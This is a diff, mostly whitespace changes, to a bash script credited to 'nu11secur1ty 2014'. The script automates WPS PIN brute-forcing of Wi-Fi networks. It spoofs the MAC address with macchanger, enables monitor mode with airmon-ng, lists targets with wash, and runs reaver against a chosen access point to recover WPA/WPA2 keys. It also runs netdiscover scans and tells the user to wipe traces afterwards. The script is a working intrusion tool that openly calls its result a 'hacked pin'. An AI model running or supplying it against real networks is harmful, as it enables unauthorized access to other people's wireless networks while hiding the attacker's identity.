@@ -1,4 +1,3 @@
-
 #!/bin/bash
 #----------------------------------------------------------------------------------------------#
 #copyright @ nu11secur1ty 2014                                                                 #
@@ -54,13 +53,13 @@ nautilus "$PWD"
    echo -e "\e[00;31m  When you see the reaver folder to open.
   CLEAN EVERY MAC SESSION IN THIS FOLDER FOR YOUR SAFETY AND CLOSED THE FILE!!\e[00m"
    echo -e "\e[00;35m[NOTE]\e[00m Do not delete reaver.db :D" 
-   return $?
+      return $?
 }
 # run if user hits control-c
    control_c()
 {
    cleanup
-   exit $?
+      exit $?
 }
 # trap keyboard interrupt (control-c)
 trap control_c SIGINT
@@ -80,7 +79,7 @@ trap control_c SIGINT
            \e[00;31m WARNING! If you not use wlan0 press Ctrl+C.     
            Then connect your device, and run program again!\e[00m  
           --------------------------------------------------"
-echo -e "
+ echo -e "
         \e[00;32m If you not want to use this program just press enter.\e[00m  
           ---------------------------------------------------"
 
@@ -102,16 +101,16 @@ But after the program stop this file will be deleted for your safety.\e[00m"
          xterm -e macchanger -a wlan0
          xterm -e airmon-ng start wlan0
          xterm -e timeout 120s wash -i mon0 --out-file ~/result.txt 
-         leafpad /root/result.txt &
+                  leafpad /root/result.txt &
 
          echo -e "\e[00;35m[What is the MAC address for the target?]\e[00m "
-         read TARGET
+               read TARGET
          echo -e "\e[00;35m[What is the CHANNEL for the target?]\e[00m "
-         read CHANNEL
-         gnome-terminal -e "bash -c 'reaver -i mon0 -b $TARGET -vv -c $CHANNEL; exec $SHELL'" &
+               read CHANNEL
+               gnome-terminal -e "bash -c 'reaver -i mon0 -b $TARGET -vv -c $CHANNEL; exec $SHELL'" &
          echo -e "\e[00;31m[IMPORTANT!!!]\e[00m"
          echo -e "\e[00;31m[When the program is finished save hacked pin WPA/2 and Press Ctrl+C to EXIT & ClEAN!]\e[00m"
-         sleep 48h 
+               sleep 48h 
          read 
         
    fi
@@ -129,16 +128,16 @@ But after the program stop this file will be deleted for your safety.\e[00m"
          xterm -e macchanger -a wlan1
          xterm -e airmon-ng start wlan1
          xterm -e timeout 120s wash -i mon0 --out-file ~/result.txt 
-         leafpad /root/result.txt &
+                  leafpad /root/result.txt &
 
          echo -e "\e[00;35m[What is the MAC address for the target?]\e[00m "
-         read TARGET
+               read TARGET
          echo -e "\e[00;35m[What is the CHANNEL for the target?]\e[00m "
-         read CHANNEL
-         gnome-terminal -e "bash -c 'reaver -i mon0 -b $TARGET -vv -c $CHANNEL; exec $SHELL'" &
+               read CHANNEL
+               gnome-terminal -e "bash -c 'reaver -i mon0 -b $TARGET -vv -c $CHANNEL; exec $SHELL'" &
          echo -e "\e[00;31m[IMPORTANT!!!]\e[00m"
          echo -e "\e[00;31m[When the program is finished save hacked pin WPA/2 and Press Ctrl+C to EXIT & ClEAN!]\e[00m"
-         sleep 48h 
+               sleep 48h 
          read 
          
   fi
@@ -149,18 +148,18 @@ But after the program stop this file will be deleted for your safety.\e[00m"
                xterm -e ifconfig wlan0 down
                xterm -e macchanger -a wlan0
                xterm -e ifconfig wlan0 up
-               echo -e "\e[00;34m[Wait to Scan wlan0 or press Ctrl+C to next scan]\e[00m"
+                      echo -e "\e[00;34m[Wait to Scan wlan0 or press Ctrl+C to next scan]\e[00m"
         $wlan0 xterm -geometry 100x30 -e timeout 120s netdiscover -i wlan0
              
                xterm -e ifconfig wlan1 down
                xterm -e macchanger -a wlan1
                xterm -e ifconfig wlan1 up
-               echo -e "\e[00;34m[Wait to Scan wlan1 or press Ctrl+C to EXIT]\e[00m"
+                      echo -e "\e[00;34m[Wait to Scan wlan1 or press Ctrl+C to EXIT]\e[00m"
         $wlan1 xterm -geometry 100x30 -e timeout 120s netdiscover -i wlan1
    
-               echo -e "\e[00;31m[IMPORTANT!!!]\e[00m"
-               echo -e "\e[00;31m[When the program is finished Press Ctrl+C to EXIT & ClEAN!]\e[00m"
-               sleep 5 
+                      echo -e "\e[00;31m[IMPORTANT!!!]\e[00m"
+                      echo -e "\e[00;31m[When the program is finished Press Ctrl+C to EXIT & ClEAN!]\e[00m"
+                    sleep 5 
                read
                
   fi 
